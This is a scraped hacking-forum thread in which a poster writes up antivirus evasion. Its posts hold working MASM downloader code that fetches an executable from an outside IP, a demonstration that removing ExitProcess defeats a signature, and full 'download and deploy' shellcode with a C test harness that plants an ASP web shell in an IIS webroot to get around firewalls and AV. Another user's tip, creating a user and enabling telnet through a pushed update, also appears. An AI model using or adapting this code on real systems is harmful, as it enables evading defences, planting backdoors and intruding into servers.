\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2682">\r\n						<blockquote class="postcontent restore ">\r\n							<b>Well PT was over but few question remained</b> <br />\n<br />\nAnd the best way to hack an application is RTFM[Read the f$$$$$# manual]<br />\n<a href="http://utils.kaspersky.com/docs/english/remote_adm/kasp8.0_ak_admguideen.pdf" target="_blank">http://utils.kaspersky.com/docs/engl...admguideen.pdf</a><br />\n<br />\n[1] Why did the AV admin server dint detect the Msf non encoded payload when moved to admin server, when it was getting detected on client machines?<br />\n[2] I had situation before too, were server was behind a firewall and was not able to get reverse/bind shell because of AV/Firewall, I need a way to bypass that.<br />\n[3] Will the things I did above could be done with a domain controller too?<br />\n<br />\n<br />\n<b>Answer to Q no [3] by Wipu &quot; Punter&quot;</b> suggested a better statergy which he tried before.<br />\n[-] Make a VBS or Bat script which creates a new user and then enable telnet.<br />\n[-] Push the script as update , simple and very effective <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" /> &quot; <br />\n<br />\n<font size="3">Question No [1] and [2]\'s answer is what this paper is all about <br />\n</font><br />\n<br />\n          <b> Anti Virus Evading techniques. and analyzing the quality of an AV<br />\n        </b><br />\n<br />\n<b>Signature based detection: Analyzing Efficacy and Bypassing detection</b><br />\n<br />\nWiki: <a href="http://en.wikipedia.org/wiki/Antivirus_software" target="_blank">http://en.wikipedia.org/wiki/Antivirus_software</a><br />\nCompares the contents of a file to a dictionary of virus signatures. <br />\n<b><br />\nAnalyzing the efficacy of an AV:</b><br />\n<br />\n<font size="2"><b>Test 1</b></font><br />\nTesting for false positives, I started with a simple test shell code program, a skeleton that\'s used to execute test shell codes, added few Nop instruction to it, &quot;currently the exe is absolutely harmless&quot;. <br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:120px;">#include&lt;stdio.h&gt;\nchar code[]=&quot;/x90/x90&quot;;\nint main(int argc, char **argv)\n{\n  int (*func)();\n  func = (int (*)()) code;\n  (int)(*func)();\n}</pre>\r\n</div>Uploaded to Virus total and obtained the following  results.<br />\n<br />\n<a href="http://vscan.novirusthanks.org/analysis/fbee492d20ac7f48d906e49417ef22f5/c2hlZXRlc3QtZXhl/" target="_blank">Here</a><br />\n<a href="http://www.virustotal.com/file-scan/report.html?id=c380d832fedeb48ac6d72d88f50d47633c04f4306770eaec5e097b4ffa5568df-1295288248" target="_blank">Here:</a><br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				CAT-QuickHeal    11.00    2011.01.17    Trojan.Agent.IRC<br />\n<br />\nResult:<br />\n1/ 43 (2.3%)\r\n			\r\n		</div>\r\n	</div>\r\n</div>Ya one False positive:  Quick heal proved that its India\'s own product :P <br />\n<br />\n<br />\n[-] Moved form C to ASM as now we could strike a little deeper <br />\n[-] Build a quick download virus to destination payload <br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">;-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\n ; Comilied with MASM32 \n.586\n.model flat,stdcall\noption casemap:none\n \n   include C:\\masm32\\include\\windows.inc\n   include C:\\masm32\\include\\user32.inc\n   include C:\\masm32\\include\\kernel32.inc\n   include C:\\masm32\\include\\shell32.inc\n   include C:\\masm32\\include\\urlmon.inc\n    \n   includelib \\masm32\\lib\\user32.lib\n   includelib \\masm32\\lib\\kernel32.lib\n   includelib \\masm32\\lib\\shell32.lib\n   includelib \\masm32\\lib\\urlmon.lib\n \n.data\nURL db &quot;http://110.0.0.1:84/msgbox.exe&quot;,0\nEXIT db &quot;ExitProcess&quot;\nPATH db &quot;c:\\testsas.exe&quot;,0\n\n.data\n res dd ?\n \n.code\n \n \n; -' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-http://FB1H2S.com fb1h2s http://Garage4Hackers.com-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\n \n \nstart:\n \n   invoke URLDownloadToFile,0,addr URL,addr PATH,0,0\n   invoke ExitProcess,0\n   \n       \nend start</pre>\r\n</div><b>And on compiling and linking the application itself my AVG scanner popped alerting me about the payload.</b><br />\n<img src="http://farm6.static.flickr.com/5136/5493929732_a257424801_z.jpg" border="0" alt="" /><br />\n<br />\nSo function calls Urldownloadtofile + Exit process the combination would be what AVG would have build its signature with. Ok so what if I remove Exitprocess and compile the program. <br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">;-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\n ; Comilied with MASM32 \n.586\n.model flat,stdcall\noption casemap:none\n \n   include C:\\masm32\\include\\windows.inc\n   include C:\\masm32\\include\\user32.inc\n   include C:\\masm32\\include\\kernel32.inc\n   include C:\\masm32\\include\\shell32.inc\n   include C:\\masm32\\include\\urlmon.inc\n    \n   includelib \\masm32\\lib\\user32.lib\n   includelib \\masm32\\lib\\kernel32.lib\n   includelib \\masm32\\lib\\shell32.lib\n   includelib \\masm32\\lib\\urlmon.lib\n \n.data\nURL db &quot;http://110.0.0.1:84/msgbox.exe&quot;,0\nEXIT db &quot;ExitProcess&quot;\nPATH db &quot;c:\\testsas.exe&quot;,0\n\n.data\n res dd ?\n \n.code\n \n \n; -' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-http://FB1H2S.com fb1h2s http://Garage4Hackers.com-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\n \n \nstart:\n \n   invoke URLDownloadToFile,0,addr URL,addr PATH,0,0\n      \n       \nend start</pre>\r\n</div>With out exit function the payload still works<br />\nThe output executable was scanned and and my AVG said it was clean.<br />\n<br />\n<img src="http://farm6.static.flickr.com/5134/5493335199_21f96ae47a_z.jpg" border="0" alt="" /><br />\n<br />\nAnd that\'s how signature based detection works how dump its <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2682" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2682" class="newreply" href="newreply.php?do=newreply&amp;p=2682" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2682" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2683] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2683">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">02:30 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2683" href="showthread.php?t=708&amp;p=2683&amp;viewfull=1#post2683" class="postcounter">#3</a><a id="postcount2683" name="3"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2683_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2683">\r\n						<blockquote class="postcontent restore ">\r\n							<font size="4"><b>Heuristics: Considering shell codes its not affected much</b></font><br />\nRuns the payload on a sandbox and identifies the behavior: AV plants hooks to certain critical system calls and monitors those activities , so Reverse/Bind shell and socket operations are at times an Issue.<br />\n<br />\nSo the taught is how to bypass Signature Detection + Above mentioned Heuristics + Firewall issues <br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				DownLoadFile + ExcuteFile + ExitProcess\r\n			\r\n		</div>\r\n	</div>\r\n</div>No way this could escape the heuristic behavior , well downloading a program won\'t create much panic but trying to execute it would cause suspicion .Well obviously it would not be of any use if the payload just downloads the file and dsn\'t trigger it, and triggering it is were the problem occurs. <br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				So whats the alternative ??.\r\n			\r\n		</div>\r\n	</div>\r\n</div>[+] Download Execute will cause troubles to our payload.<br />\n[-] If we just download the executable that wont be of any use<br />\n[+] And AV/Firewall could make situations tough by not letting us give reverse shell<br />\n[+] And if the application we are targeting[Apache old version] is behind a firewall and even if we were able to execute code we cant get a shell back because of the firewall. <br />\n[-] So why not use a web shell <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" />, some Php or asp shell if target has got a web server.<br />\n[+] A payload that would download a web shell and place it on the servers WebRoot directory. Or simply drops a web shell <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" />.<br />\n<br />\n All firewall let\'s  web server\'s traffic and WebSell\'s &quot;Hardly I have seen any getting detected by AV&quot; . So that budded the idea of a Download + Deploy payload.<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				Download + Executes triggers AV alert<br />\nSo just Download a WebShell and drops it in WebRoot\r\n			\r\n		</div>\r\n	</div>\r\n</div>You could get a semi interactive shell and will work fine even in case of AV and firewall.<br />\n<b>#####################################<br />\n# Title<img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" />ownload Deploy Shell code by FB1H2S<br />\n# Date: [18/1/2011]<br />\n# Author: FB1H2S<br />\n# Tested on: [Works form win xp  to Win 7 all versions]<br />\n#Downloads file form <a href="http://127.0.0.1:84/a.bak" target="_blank">http://127.0.0.1:84/a.bak </a> &gt;&gt; C:/inetpub/wwwroot/a.asp<br />\n#Place the webshell to be uploaded on ur local server webroot<br />\n#Current payload data is Hard coded with Url and path need suggestions and will convert to MSF <br />\n##################################################  ############<br />\n</b><br />\n<br />\n<b>Assembly Code:</b><br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">;# Title:Download Deploy Shell code by FB1H2S\n;# Date: [18/1/2011]\n;# Author: FB1H2S http://Garage4hackers.com http://fb1h2s.com\n;# Tested on: [win xp, works  up to Win 7 all versions]\n;\n;#File: Download_deploy.asm\n;\n[BITS 32]\n\nglobal _start\n\n_start:\n\n    jmp short entry    ; \n\n%include &quot;kernal32.asm&quot;\n\nbegin:\n    call find_kernel32    \n       mov ebx, eax        \n    jmp short u    ; Skip\n\nentry:\n    call begin        \n\nu:\n    push  0xec0e4e8e    ; LoadLibraryA hash\n    push ebx        ; kernel32 base address\n    call find_function    ; find address\n\n    ; LoadLibraryA\n    PUSH 0x00206e6f\n    PUSH 0x6d6c7275\n    xor ecx, ecx        \n    mov [esp + 9],cl\n    mov ecx , esp\n    push ecx\n    call eax        ; eax holds our function address\n\ndownload:\n    push  0x702f1a36    ; URLDownloadToFileAhash\n    push eax        ; u-lmon.dll base address\n    call find_function    ; find address\n    \n    pop edi\n    xor ebp, ebp\n    PUSH 0x58202020 ; path to deploy\n    PUSH 0x7073612e\n    PUSH 0x735c746f\n    PUSH 0x6f727777\n    PUSH 0x775c6275\n    PUSH 0x7074656e\n    PUSH 0x495c3a43\n    mov ebp , esp\n    xor ecx, ecx        ; ecx = 0 we need it for some time\n    mov [ebp + 24], cl   ;ebp no null\n    PUSH 0x58202065  ; url to file\n    PUSH 0x78652e61\n    PUSH 0x2f34383a\n    PUSH 0x312e302e\n    PUSH 0x302e3732\n    PUSH 0x312f2f3a\n    PUSH 0x70747468\n    mov edi, esp\n    mov [edi + 25], cl ; edi no null\n    push ecx        ; lpfnCB\n    push ecx        ; dwReserved\n    push ebp        ; szFileName\n    push edi        ;url\n    push ecx        ; pCaller\n    call eax        ; eax holds our function address\n\nexit:\n    push 0x73e2d87e        ; ExitProcess hash\n    push ebx        ; kernel32 base address\n    call find_function    ; find address\n    ; ExitProcess \n    call eax        ; holds our function address\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n;#\n;#\n;#Code file: kernal.asm\n;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;\n\n\nfind_kernel32:\n    xor eax, eax ; clear eax\n    mov eax, [fs:0x30 ] ; pointer to the PEB\n    mov eax, [ eax + 0x0C ] ; get PEB-&gt;Ldr\n    mov eax, [ eax + 0x14 ] ; get PEB-&gt;Ldr.InMemoryOrderModuleList.Flink\n    ; (1st entry)\n    mov eax, [ eax ] ; (2nd entry)\n    mov eax, [ eax ] ; (3rd entry)\n    mov eax, [ eax + 0x10 ] ;3rd entries base address\n    ; eax = kernel32.dll works on all windows versions xp to win 7\n    ret\n\n\nfind_function:\n    pushad                  ; Save all registers\n    mov   ebp, [esp + 0x24]        \n    mov   eax, [ebp + 0x3c]        \n    mov   edx, [ebp + eax + 0x78]  \n    add   edx, ebp                 \n    mov   ecx, [edx + 0x18]        \n    mov   ebx, [edx + 0x20]        \n    add   ebx, ebp                 \nfind_function_loop:\n    jecxz find_function_finished   \n    dec   ecx                      \n    mov   esi, [ebx + ecx * 4]     \n    add   esi, ebp                 \n\ncompute_hash:\n    xor   edi, edi                ; Zero edi\n    xor   eax, eax                ; Zero eax\n    cld                           ; Clear direction\n\ncompute_hash_again:\n    lodsb                         ; Load the next byte from esi into al\n    test  al, al                  ; Test ourselves.\n    jz    compute_hash_finished   ; If the ZF is set, we\'ve hit the null term.\n    ror   edi, 0xd                ; Rotate edi 13 bits to the right\n    add   edi, eax                ; Add the new byte to the accumulator\n    jmp   compute_hash_again      ; Next iteration\n\ncompute_hash_finished:         \nfind_function_compare:           \n    cmp   edi, [esp + 0x28]       \n    jnz   find_function_loop      \n    mov   ebx, [edx + 0x24]       \n    add   ebx, ebp                \n    mov   cx, [ebx + 2 * ecx]     \n    mov   ebx, [edx + 0x1c]        \n    add   ebx, ebp                \n    mov   eax, [ebx + 4 * ecx]    \n    add   eax, ebp                \n    mov   [esp + 0x1c], eax       \n\nfind_function_finished:\n    popad                         ; Restore all registers\n    ret</pre>\r\n</div><b>Test the Shell Code:</b><br />\n<br />\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">// Download file form location\n//Url hardcoded so not Use full for all yet\n#include&lt;stdio.h&gt;\nchar code[] = &quot;\\xeb\\x70\\x31\\xc0\\x64\\xa1\\x30\\x00&quot;\n&quot;\\x00\\x00\\x8b\\x40\\x0c\\x8b\\x40\\x14&quot;\n&quot;\\x8b\\x00\\x8b\\x00\\x8b\\x40\\x10\\xc3&quot;\n&quot;\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c&quot;\n&quot;\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a&quot;\n&quot;\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x37&quot;\n&quot;\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff&quot;\n&quot;\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x0a&quot;\n&quot;\\xc1\\xcf\\x0d\\x01\\xc7\\xe9\\xf1\\xff&quot;\n&quot;\\xff\\xff\\x3b\\x7c\\x24\\x28\\x75\\xde&quot;\n&quot;\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\\x0c&quot;\n&quot;\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04&quot;\n&quot;\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\\x61&quot;\n&quot;\\xc3\\xe8\\x94\\xff\\xff\\xff\\x89\\xc3&quot;\n&quot;\\xeb\\x05\\xe8\\xf2\\xff\\xff\\xff\\x68&quot;\n&quot;\\x8e\\x4e\\x0e\\xec\\x53\\xe8\\x96\\xff&quot;\n&quot;\\xff\\xff\\x68\\x6f\\x6e\\x20\\x00\\x68&quot;\n&quot;\\x75\\x72\\x6c\\x6d\\x31\\xc9\\x88\\x4c&quot;\n&quot;\\x24\\x09\\x89\\xe1\\x51\\xff\\xd0\\x68&quot;\n&quot;\\x36\\x1a\\x2f\\x70\\x50\\xe8\\x76\\xff&quot;\n&quot;\\xff\\xff\\x5f\\x31\\xed\\x68\\x20\\x20&quot;\n&quot;\\x20\\x00\\x68\\x2e\\x61\\x73\\x70\\x68&quot;\n&quot;\\x6f\\x74\\x5c\\x73\\x68\\x77\\x77\\x72&quot;\n&quot;\\x6f\\x68\\x75\\x62\\x5c\\x77\\x68\\x6e&quot;\n&quot;\\x65\\x74\\x70\\x68\\x43\\x3a\\x5c\\x49&quot;\n&quot;\\x89\\xe5\\x31\\xc9\\x88\\x4d\\x18\\x68&quot;\n&quot;\\x65\\x20\\x20\\x00\\x68\\x61\\x2e\\x65&quot;\n&quot;\\x78\\x68\\x3a\\x38\\x34\\x2f\\x68\\x2e&quot;\n&quot;\\x30\\x2e\\x31\\x68\\x32\\x37\\x2e\\x30&quot;\n&quot;\\x68\\x3a\\x2f\\x2f\\x31\\x68\\x68\\x74&quot;\n&quot;\\x74\\x70\\x89\\xe7\\x88\\x4f\\x1a\\x51&quot;\n&quot;\\x51\\x55\\x57\\x51\\xff\\xd0\\x68\\x7e&quot;\n&quot;\\xd8\\xe2\\x73\\x53\\xe8\\x0f\\xff\\xff&quot;\n&quot;\\xff\\xff\\xd0&quot;;\nint main(int argc, char **argv)\n{\nint (*func)();\nfunc = (int (*)()) code;\n(int)(*func)();\n}</pre>\r\n</div><img src="http://farm6.static.flickr.com/5140/5493335277_d48f81f9ae_z.jpg" border="0" alt="" /><br />\n<br />\n[+] Issues: Url and path are Hard Coded so its Use less I published the code to get suggestions so that I could make an Improved version of code and make a Metsploit module<br />\n[-]Currently Web Root path is Hard coded and I cant think about a way if web root is changed <br />\n[-] Need a solution to dynamically finds the web roots IIS and Apache to make the Shell code better.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2683" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2683" class="newreply" href="newreply.php?do=newreply&amp;p=2683" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2683" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2686] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2686">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">10:05 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2686" href="showthread.php?t=708&amp;p=2686&amp;viewfull=1#post2686" class="postcounter">#4</a><a id="postcount2686" name="4"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=18" title="prashant_uniyal is offline"><strong>prashant_uniyal</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=18" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=18&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=18" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=18" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://hackingethics.wordpress.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/18-prashant_uniyal" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="prashant_uniyal is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Analyst\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2686_18" title="prashant_uniyal has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=18" title="prashant_uniyal is offline">\r\n				<img src="image.php?u=18&amp;dateline=1393305256" alt="prashant_uniyal\'s Avatar" title="prashant_uniyal\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>localhost</dd>\r\n					\r\n					<dt>Posts</dt> <dd>505</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=18">8</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2686">\r\n						<blockquote class="postcontent restore ">\r\n							Mind blowing fb1....!!! Keep rockingg <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /> <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" />\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer"><i><b>The three great essentials to achieve anything worth while are: Hard work, Stick-to-itiveness, and Common sense.</b></i> - <b>Thomas A. Edison</b><br />\r\n__________________________________________________  _____________________</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2686" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2686" class="newreply" href="newreply.php?do=newreply&amp;p=2686" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2686" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
